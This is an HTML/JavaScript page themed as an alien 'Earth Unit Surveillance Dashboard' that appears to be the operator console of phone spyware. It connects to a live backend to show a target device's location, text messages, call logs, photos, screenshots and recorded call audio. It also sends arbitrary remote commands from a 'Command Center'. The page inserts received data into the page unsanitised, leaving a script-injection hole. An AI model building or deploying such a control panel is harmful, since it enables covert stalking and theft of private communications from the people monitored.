<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alien System Monitor</title>
    <style>
        /* Base Styles */
        :root {
            --alien-green: #00ff9d;
            --alien-purple: #7d12ff;
            --alien-dark: #0a0a20;
            --alien-blue: #00a8ff;
            --alien-pink: #ff00aa;
            --alien-yellow: #ffe600;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: var(--alien-dark);
            color: white;
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* Galactic Starfield */
        .starfield {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: radial-gradient(ellipse at center, 
                rgba(10,10,40,0.8) 0%, 
                rgba(5,5,20,0.9) 100%);
            animation: rotate 240s linear infinite;
        }

        .star {
            position: absolute;
            background-color: white;
            border-radius: 50%;
            animation: twinkle var(--duration) infinite ease-in-out;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 1; }
        }

        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(10, 10, 32, 0.85);
            min-height: 100vh;
            border-left: 1px solid var(--alien-green);
            border-right: 1px solid var(--alien-green);
            box-shadow: 0 0 30px rgba(0, 255, 157, 0.2);
        }

        /* Header Styles */
        .alien-header {
            text-align: center;
            padding: 20px 0;
            position: relative;
            margin-bottom: 30px;
            border-bottom: 2px solid var(--alien-purple);
        }

        .ufo-container {
            position: relative;
            width: 150px;
            height: 80px;
            margin: 0 auto 20px;
        }

        .ufo-svg {
            width: 150px;
            height: 80px;
            filter: drop-shadow(0 0 15px var(--alien-blue));
            z-index: 2;
            position: relative;
        }

        .ufo-light {
            position: absolute;
            bottom: -20px;
            left: 50%;
            transform: translateX(-50%);
            width: 120px;
            height: 40px;
            background: radial-gradient(ellipse at center, 
                var(--alien-green) 0%, 
                rgba(0, 255, 157, 0.5) 50%, 
                transparent 70%);
            border-radius: 50%;
            z-index: 1;
            animation: pulse 3s infinite alternate;
        }

        @keyframes pulse {
            0% { opacity: 0.7; width: 120px; }
            100% { opacity: 1; width: 150px; }
        }

        h1 {
            font-family: 'Courier New', monospace;
            color: var(--alien-green);
            font-size: 2.5rem;
            letter-spacing: 2px;
            margin-bottom: 5px;
            text-shadow: 0 0 10px var(--alien-green);
        }

        .subtitle {
            font-family: 'Courier New', monospace;
            color: var(--alien-blue);
            font-size: 1.2rem;
            letter-spacing: 3px;
        }

        /* Dashboard Styles */
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }

        .panel {
            background-color: rgba(20, 20, 50, 0.7);
            border-radius: 10px;
            padding: 20px;
            border: 1px solid var(--alien-purple);
            box-shadow: 0 0 20px rgba(125, 18, 255, 0.2);
        }

        .panel h2 {
            font-family: 'Courier New', monospace;
            color: var(--alien-pink);
            margin-bottom: 20px;
            font-size: 1.5rem;
            border-bottom: 1px solid var(--alien-purple);
            padding-bottom: 10px;
            display: flex;
            align-items: center;
        }

        .alien-icon {
            margin-right: 10px;
            font-size: 1.8rem;
        }

        /* Device Status Styles */
        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }

        .status-item {
            background-color: rgba(0, 168, 255, 0.1);
            border: 1px solid var(--alien-blue);
            border-radius: 8px;
            padding: 15px;
            transition: all 0.3s ease;
        }

        .status-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(0, 168, 255, 0.3);
        }

        .status-label {
            font-family: 'Courier New', monospace;
            color: var(--alien-yellow);
            font-size: 0.9rem;
            margin-bottom: 5px;
            letter-spacing: 1px;
        }

        .status-value {
            font-family: 'Courier New', monospace;
            font-size: 1.3rem;
            color: white;
            margin-bottom: 5px;
        }

        .status-detail {
            font-size: 0.8rem;
            color: #aaa;
        }

        .battery-container {
            display: flex;
            align-items: center;
            margin: 10px 0;
        }

        .battery-level {
            height: 20px;
            background: linear-gradient(to right, #ff0000, #ff9900, #33cc33);
            border-radius: 3px;
            transition: width 0.5s ease;
        }

        .battery-percent {
            margin-left: 10px;
            font-family: 'Courier New', monospace;
            font-size: 1.2rem;
        }

        /* Communications Panel */
        .tabs {
            display: flex;
            margin-bottom: 15px;
            border-bottom: 1px solid var(--alien-purple);
        }

        .tab-btn {
            background: none;
            border: none;
            color: var(--alien-blue);
            padding: 8px 15px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            position: relative;
        }

        .tab-btn.active {
            color: var(--alien-green);
        }

        .tab-btn.active::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 0;
            width: 100%;
            height: 2px;
            background-color: var(--alien-green);
        }

        .tab-content {
            display: none;
            height: 300px;
            overflow-y: auto;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
        }

        .tab-content.active {
            display: block;
        }

        .message-list, .call-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .message-item, .call-item {
            background-color: rgba(0, 168, 255, 0.1);
            border-left: 3px solid var(--alien-blue);
            padding: 10px;
            border-radius: 0 5px 5px 0;
        }

        .message-item.incoming {
            border-left-color: var(--alien-green);
        }

        .message-item.outgoing {
            border-left-color: var(--alien-pink);
        }

        .message-header, .call-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 5px;
            font-size: 0.9rem;
        }

        .message-number, .call-number {
            color: var(--alien-yellow);
            font-family: 'Courier New', monospace;
        }

        .message-time, .call-time {
            color: #aaa;
            font-size: 0.8rem;
        }

        .message-content {
            font-size: 0.9rem;
        }

        .media-gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
        }

        .media-item {
            height: 150px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 5px;
            overflow: hidden;
            position: relative;
        }

        .media-item img, .media-item video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .media-type {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: rgba(0, 0, 0, 0.7);
            padding: 3px 5px;
            font-size: 0.7rem;
            text-align: center;
        }

        /* Command Center */
        .command-form {
            display: flex;
            margin-bottom: 15px;
            gap: 10px;
        }

        #command-input {
            flex: 1;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.5);
            border: 1px solid var(--alien-blue);
            color: white;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        #command-input:focus {
            outline: none;
            border-color: var(--alien-green);
            box-shadow: 0 0 10px rgba(0, 255, 157, 0.5);
        }

        #send-command {
            background-color: var(--alien-purple);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
            transition: all 0.3s ease;
        }

        #send-command:hover {
            background-color: var(--alien-pink);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 0, 170, 0.4);
        }

        .command-log {
            height: 200px;
            overflow-y: auto;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            color: var(--alien-green);
            border: 1px solid var(--alien-purple);
        }

        .command-entry {
            margin-bottom: 5px;
            padding-bottom: 5px;
            border-bottom: 1px solid rgba(125, 18, 255, 0.3);
        }

        .command-time {
            color: #aaa;
            font-size: 0.8rem;
            margin-right: 10px;
        }

        /* Footer Styles */
        .alien-footer {
            text-align: center;
            padding: 20px 0;
            border-top: 2px solid var(--alien-purple);
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: space-between;
        }

        .status-active {
            color: var(--alien-green);
            text-shadow: 0 0 5px var(--alien-green);
        }

        /* Responsive Styles */
        @media (max-width: 900px) {
            .dashboard {
                grid-template-columns: 1fr;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            .subtitle {
                font-size: 1rem;
            }
        }

        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .new-data {
            animation: fadeIn 0.5s ease-out;
        }
    </style>
</head>
<body>
    <!-- Galactic Starfield Background -->
    <div class="starfield" id="starfield"></div>

    <!-- Main Container -->
    <div class="container">
        <header class="alien-header">
            <div class="ufo-container">
                <svg class="ufo-svg" viewBox="0 0 150 80" xmlns="http://www.w3.org/2000/svg">
                    <!-- UFO Body -->
                    <ellipse cx="75" cy="40" rx="60" ry="20" fill="#7d12ff" filter="url(#glow)"/>
                    <!-- UFO Dome -->
                    <ellipse cx="75" cy="30" rx="40" ry="15" fill="rgba(0, 168, 255, 0.3)" stroke="#00a8ff" stroke-width="1"/>
                    <!-- UFO Lights -->
                    <circle cx="45" cy="40" r="3" fill="#00ff9d"/>
                    <circle cx="60" cy="40" r="3" fill="#ff00aa"/>
                    <circle cx="75" cy="40" r="3" fill="#ffe600"/>
                    <circle cx="90" cy="40" r="3" fill="#00ff9d"/>
                    <circle cx="105" cy="40" r="3" fill="#ff00aa"/>
                    <!-- Glow Effect -->
                    <defs>
                        <filter id="glow" x="-30%" y="-30%" width="160%" height="160%">
                            <feGaussianBlur stdDeviation="5" result="blur"/>
                            <feComposite in="SourceGraphic" in2="blur" operator="over"/>
                        </filter>
                    </defs>
                </svg>
                <div class="ufo-light"></div>
            </div>
            <h1>INTERGALACTIC MONITORING SYSTEM</h1>
            <p class="subtitle">EARTH UNIT SURVEILLANCE DASHBOARD</p>
        </header>

        <main class="dashboard">
            <section class="panel device-status">
                <h2><span class="alien-icon">👽</span> DEVICE STATUS</h2>
                <div class="status-grid">
                    <div class="status-item">
                        <div class="status-label">LOCATION</div>
                        <div class="status-value" id="location">Acquiring...</div>
                        <div class="status-detail" id="accuracy">Accuracy: -- meters</div>
                    </div>
                    <div class="status-item">
                        <div class="status-label">BATTERY</div>
                        <div class="battery-container">
                            <div class="battery-level" id="battery-level" style="width: 50%;"></div>
                            <div class="battery-percent" id="battery-percent">--%</div>
                        </div>
                        <div class="status-detail" id="charging-status">Status: Unknown</div>
                    </div>
                    <div class="status-item">
                        <div class="status-label">LAST UPDATE</div>
                        <div class="status-value" id="last-update">--:--:--</div>
                        <div class="status-detail" id="uptime">Uptime: -- days</div>
                    </div>
                </div>
            </section>

            <section class="panel communications">
                <h2><span class="alien-icon">👽</span> COMMUNICATIONS</h2>
                <div class="tabs">
                    <button class="tab-btn active" data-tab="messages">Messages</button>
                    <button class="tab-btn" data-tab="calls">Calls</button>
                    <button class="tab-btn" data-tab="media">Media</button>
                </div>
                <div class="tab-content active" id="messages-tab">
                    <div class="message-list" id="message-list"></div>
                </div>
                <div class="tab-content" id="calls-tab">
                    <div class="call-list" id="call-list"></div>
                </div>
                <div class="tab-content" id="media-tab">
                    <div class="media-gallery" id="media-gallery"></div>
                </div>
            </section>

            <section class="panel command-center">
                <h2><span class="alien-icon">👽</span> COMMAND CENTER</h2>
                <div class="command-form">
                    <input type="text" id="command-input" placeholder="Enter command...">
                    <button id="send-command">TRANSMIT</button>
                </div>
                <div class="command-log" id="command-log"></div>
            </section>
        </main>

        <footer class="alien-footer">
            <p>SYSTEM STATUS: <span class="status-active">ACTIVE</span></p>
            <p>EARTH TIME: <span id="earth-time">--:--:--</span></p>
        </footer>
    </div>

    <script>
        // Configuration
        const BACKEND_URL = 'https://web-production-44cdd.up.railway.app';
        const WS_URL = BACKEND_URL.replace(/^http/, 'ws') + '/ws';

        // Create rotating starfield
        function createStarfield() {
            const starfield = document.getElementById('starfield');
            const starsCount = 200;
            const centerX = window.innerWidth / 2;
            const centerY = window.innerHeight / 2;

            for (let i = 0; i < starsCount; i++) {
                const star = document.createElement('div');
                star.className = 'star';

                const size = Math.random() * 3;
                const distance = 50 + Math.random() * Math.max(centerX, centerY);
                const angle = Math.random() * Math.PI * 2;
                const duration = 2 + Math.random() * 3 + 's';
                const delay = Math.random() * 5 + 's';

                const x = centerX + Math.cos(angle) * distance;
                const y = centerY + Math.sin(angle) * distance;

                star.style.width = `${size}px`;
                star.style.height = `${size}px`;
                star.style.left = `${x}px`;
                star.style.top = `${y}px`;
                star.style.setProperty('--duration', duration);
                star.style.animationDelay = delay;

                const colorVal = 200 + Math.floor(Math.random() * 55);
                star.style.backgroundColor = `rgb(${colorVal}, ${colorVal}, 255)`;

                starfield.appendChild(star);
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            // Initialize starfield
            createStarfield();

            // WebSocket connection
            const socket = new WebSocket(WS_URL);

            // DOM Elements
            const commandInput = document.getElementById('command-input');
            const sendCommandBtn = document.getElementById('send-command');
            const commandLog = document.getElementById('command-log');
            const messageList = document.getElementById('message-list');
            const callList = document.getElementById('call-list');
            const mediaGallery = document.getElementById('media-gallery');
            const locationDisplay = document.getElementById('location');
            const accuracyDisplay = document.getElementById('accuracy');
            const batteryLevel = document.getElementById('battery-level');
            const batteryPercent = document.getElementById('battery-percent');
            const chargingStatus = document.getElementById('charging-status');
            const lastUpdate = document.getElementById('last-update');
            const uptimeDisplay = document.getElementById('uptime');
            const earthTime = document.getElementById('earth-time');
            const tabBtns = document.querySelectorAll('.tab-btn');
            const tabContents = document.querySelectorAll('.tab-content');

            // Initial data fetching
            fetchInitialData();

            // Tab functionality
            tabBtns.forEach(btn => {
                btn.addEventListener('click', () => {
                    tabBtns.forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');

                    tabContents.forEach(content => content.classList.remove('active'));
                    document.getElementById(`${btn.dataset.tab}-tab`).classList.add('active');
                });
            });

            // Command functionality
            sendCommandBtn.addEventListener('click', sendCommand);
            commandInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') sendCommand();
            });

            function sendCommand() {
                const command = commandInput.value.trim();
                if (command) {
                    fetch(`${BACKEND_URL}/command`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ command: command })
                    })
                    .then(response => response.json())
                    .then(data => {
                        logCommand(`Command sent: ${command}`, 'outgoing');
                        commandInput.value = '';
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        logCommand(`Command failed: ${error.message}`, 'error');
                    });
                }
            }

            function logCommand(text, type) {
                const now = new Date();
                const timeString = now.toLocaleTimeString();
                const entry = document.createElement('div');
                entry.className = `command-entry ${type}`;
                entry.innerHTML = `<span class="command-time">${timeString}</span> ${text}`;
                commandLog.appendChild(entry);
                commandLog.scrollTop = commandLog.scrollHeight;
            }

            // WebSocket message handling
            socket.addEventListener('message', function(event) {
                logCommand(event.data, 'incoming');
                // You might want to parse the data here and update the dashboard as necessary.
            });

            // Fetch initial data from the server
            function fetchInitialData() {
                fetch(`${BACKEND_URL}/static/status.json`)
                    .then(response => response.json())
                    .then(data => updateDashboard(data))
                    .catch(error => console.error('Failed to fetch initial data:', error));
            }

            // Dashboard update logic
            function updateDashboard(data) {
                // Update device status
                if (data.location) {
                    locationDisplay.textContent = `${data.location.lat.toFixed(4)}, ${data.location.lon.toFixed(4)}`;
                    accuracyDisplay.textContent = `Accuracy: ${Math.round(data.location.accuracy)} meters`;
                }

                if (data.battery !== undefined) {
                    const batteryWidth = Math.max(5, data.battery);
                    batteryLevel.style.width = `${batteryWidth}%`;
                    batteryPercent.textContent = `${data.battery}%`;

                    // Change color based on battery level
                    if (data.battery < 20) {
                        batteryLevel.style.background = 'linear-gradient(to right, #ff0000, #ff3300)';
                    } else if (data.battery < 50) {
                        batteryLevel.style.background = 'linear-gradient(to right, #ff3300, #ff9900)';
                    } else {
                        batteryLevel.style.background = 'linear-gradient(to right, #ff9900, #33cc33)';
                    }
                }

                if (data.charging !== undefined) {
                    chargingStatus.textContent = data.charging ? 'Status: Charging ⚡' : 'Status: Discharging';
                }

                const now = new Date();
                lastUpdate.textContent = now.toLocaleTimeString();
                // Here, increment the uptime count as applicable.
                // You can also display how long the server has been running if that data is available.

                // Update messages
                if (data.messages && data.messages.length > 0) {
                    messageList.innerHTML = '';
                    data.messages.forEach(msg => {
                        const messageItem = document.createElement('div');
                        messageItem.className = `message-item ${msg.direction} new-data`;
                        messageItem.innerHTML = `
                            <div class="message-header">
                                <span class="message-number">${msg.number}</span>
                                <span class="message-time">${new Date().toLocaleTimeString()}</span>
                            </div>
                            <div class="message-content">${msg.content}</div>
                        `;
                        messageList.appendChild(messageItem);
                    });
                }

                // Update calls
                if (data.calls && data.calls.length > 0) {
                    callList.innerHTML = '';
                    data.calls.forEach(call => {
                        const callItem = document.createElement('div');
                        callItem.className = `call-item new-data`;
                        callItem.innerHTML = `
                            <div class="call-header">
                                <span class="call-number">${call.number}</span>
                                <span class="call-time">${new Date().toLocaleTimeString()}</span>
                            </div>
                            <div class="call-duration">Duration: ${call.duration} seconds</div>
                            <div class="call-direction">${call.direction === 'incoming' ? '📞 Incoming' : '📞 Outgoing'}</div>
                        `;
                        callList.appendChild(callItem);
                    });
                }

                // Update media (you could customize how media is received and displayed)
                if (data.media && data.media.length > 0) {
                    mediaGallery.innerHTML = '';
                    data.media.forEach(media => {
                        const mediaItem = document.createElement('div');
                        mediaItem.className = 'media-item new-data';

                        if (media.type === 'photo' || media.type === 'screenshot') {
                            mediaItem.innerHTML = `
                                <img src="data:image/jpeg;base64,${media.data}" alt="${media.type}">
                                <div class="media-type">${media.type.toUpperCase()}</div>
                            `;
                        } else if (media.type === 'call_audio') {
                            mediaItem.innerHTML = `
                                <audio controls>
                                    <source src="data:audio/ogg;base64,${media.data}" type="audio/ogg">
                                </audio>
                                <div class="media-type">AUDIO RECORDING</div>
                            `;
                        }

                        mediaGallery.appendChild(mediaItem);
                    });
                }
            }

            // Update Earth time
            function updateEarthTime() {
                const now = new Date();
                earthTime.textContent = now.toLocaleTimeString();
            }
            setInterval(updateEarthTime, 1000);
            updateEarthTime();
        });

        // Handle window resize
        window.addEventListener('resize', function() {
            const starfield = document.getElementById('starfield');
            starfield.innerHTML = '';
            createStarfield();
        });
    </script>
</body>
</html>
